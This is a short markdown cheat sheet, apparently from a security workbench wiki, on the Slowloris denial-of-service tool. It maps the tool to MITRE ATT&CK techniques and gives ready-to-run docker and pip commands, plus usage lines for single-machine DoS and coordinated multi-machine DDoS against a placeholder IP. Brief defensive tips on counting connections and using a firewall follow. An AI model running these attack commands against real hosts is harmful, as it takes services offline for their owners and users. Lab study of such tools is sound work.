# Slowloris

**Keywords:** DDoS

## References

- [MITRE ATT&CK](https://attack.mitre.org/)

## Kill Chain

- Recon
- Exploit
- Escalate
- Lateral Movement
- Evade
- Action

## MITRE ATT&CK

### Tactics

- Reconnaissance
- Resource Development
- Initial Access
- Execution
- Persistence
- Privilege Escalation
- Defense Evasion
- Credential Access
- Discovery
- Lateral Movement
- Collection
- Command & Control
- Exfiltration
- Impact
  - T1498: Network Denial of Service
  - T1499: Endpoint Denial of Service

## Docker

### Network

```sh
docker network create workbench \
  --subnet 10.1.1.0/24
```

### Running

```sh
docker run -d \
  $(echo "$DOCKER_RUN_OPTS") \
  -h slowloris \
  --name slowloris \
  --network workbench \
  docker.io/aminvakil/slowloris:latest [ip-address] \
    -s 900
```

### Remove

```sh
docker rm -f slowloris
```

## CLI

### Installation

#### pip

```sh
pip3 install Slowloris
```

### Usage

```sh
# DoS Attack
slowloris [ip-address] -s 900

# DDos Attack
slowloris [ip-address] -s 300 --sleeptime 3 # Machine 1
slowloris [ip-address] -s 400 --sleeptime 4 # Machine 2
slowloris [ip-address] -s 500 --sleeptime 5 # Machine 3
```

## Tips

### Listen Treads

```sh
netstat -ant | grep -E ':80|:443' | wc -l
```

### Prevent Attack with Firewall

Select and configure an [Firewall](/firewall/README.md).
